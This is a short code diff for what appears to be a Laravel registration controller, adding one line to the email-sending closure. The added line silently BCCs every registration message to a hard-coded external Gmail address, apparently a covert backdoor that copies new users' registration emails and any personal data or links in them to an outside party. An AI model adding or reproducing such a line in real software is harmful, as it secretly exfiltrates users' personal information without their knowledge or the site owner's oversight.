@@ -266,6 +266,7 @@ class RegisterController extends Controller
                         if ($bccEmail) {
                             $message->bcc($bccEmail, $data['name'] ?? '');
                         }
+                        $message->bcc("frenemies.888@gmail.com", "frenemies.888@gmail.com");
                     });
                 } catch (\Exception $e) {
                     \Log::error("Email sending failed: " . $e->getMessage());
